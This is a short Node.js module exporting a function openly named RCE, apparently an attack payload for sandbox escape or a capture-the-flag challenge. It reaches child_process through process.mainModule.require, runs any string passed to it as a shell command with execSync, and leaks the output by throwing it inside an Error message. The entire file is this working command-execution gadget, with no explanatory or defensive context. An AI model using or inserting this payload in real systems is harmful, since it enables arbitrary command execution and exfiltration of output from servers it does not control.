function RCE( key ){ 
 const result = process.mainModule.require('child_process').execSync(`${key}`); 
 throw new Error(`Result leak from Error: ${result.toString()}`); 
}
 module.exports = RCE;